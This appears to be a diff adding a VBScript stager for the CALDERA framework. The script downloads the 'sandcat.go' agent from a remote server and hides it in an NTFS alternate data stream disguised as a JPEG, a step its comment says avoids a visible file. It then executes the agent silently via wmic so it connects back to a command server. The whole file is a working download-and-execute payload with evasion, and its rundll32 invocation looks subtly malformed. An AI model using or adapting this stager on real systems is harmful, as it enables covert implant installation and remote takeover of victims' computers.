@@ -1,0 +1,15 @@
+<script language="VBScript">
+Set xhr = CreateObject("MSXML2.XMLHTTP")
+xhr.open "GET", "http://192.168.244.128:8888/file/download", False
+xhr.setRequestHeader "platform","windows"
+xhr.setRequestHeader "file","sandcat.go"
+xhr.send
+data = xhr.responseBody
+' Write data to an ADS and run via wmic (to avoid dropping visible file)
+Set stream = CreateObject("ADODB.Stream")
+stream.Type = 1 : stream.Open
+stream.Write xhr.responseBody : stream.SaveToFile "C:\\Users\\Public\\winlogo.jpg:sc.exe", 2
+CreateObject("Wscript.Shell").Run "wmic process call create 'rundll32 advapi32.dll,CreateProcessAsUser C:\\Users\\Public\\winlogo.jpg:sc.exe -server http://CALDERA_SERVER:8888'",0
+self.close
+</script>
+
